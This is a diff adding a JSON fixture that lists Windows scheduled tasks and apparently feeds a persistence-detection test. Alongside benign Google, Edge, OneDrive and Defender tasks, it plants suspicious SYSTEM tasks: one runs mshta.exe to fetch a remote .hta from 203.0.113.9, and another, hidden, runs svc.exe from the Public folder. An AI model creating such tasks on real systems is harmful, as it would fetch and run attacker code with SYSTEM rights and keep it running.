@@ -1,0 +1,164 @@
+[
+ {
+  "TaskName": "GoogleUpdateTaskMachineUA",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\"",
+    "Arguments": "/ua /installsource scheduler"
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "MicrosoftEdgeUpdateTaskMachineCore",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"",
+    "Arguments": "/c"
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "OneDrive Standalone Update Task-S-1-5-21-1000-2000-3000-1001",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "FIXTURE-WS01\\alice",
+  "RunLevel": "Limited",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
+    "Arguments": ""
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "Windows Defender Scheduled Scan",
+  "TaskPath": "\\Microsoft\\Windows\\Windows Defender\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
+    "Arguments": "Scan -ScheduleJob -ScanTrigger 55"
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "Schedule Scan",
+  "TaskPath": "\\Microsoft\\Windows\\UpdateOrchestrator\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "%systemroot%\\system32\\usoclient.exe",
+    "Arguments": "StartScan"
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "Contoso Backup Nightly",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "powershell.exe",
+    "Arguments": "-NoProfile -ExecutionPolicy Bypass -File \"C:\\Program Files\\Contoso Backup\\nightly.ps1\""
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "Updater",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "C:\\Windows\\System32\\mshta.exe",
+    "Arguments": "http://203.0.113.9/a.hta"
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "SysHealth",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": true,
+  "Actions": [
+   {
+    "Execute": "C:\\Users\\Public\\svc.exe",
+    "Arguments": ""
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ },
+ {
+  "TaskName": "Cleanup Scripts",
+  "TaskPath": "\\",
+  "State": "Ready",
+  "Author": "",
+  "UserId": "SYSTEM",
+  "RunLevel": "Highest",
+  "Hidden": false,
+  "Actions": [
+   {
+    "Execute": "C:\\Scripts\\cleanup.bat",
+    "Arguments": ""
+   }
+  ],
+  "Triggers": [
+   "MSFT_TaskTimeTrigger"
+  ]
+ }
+]
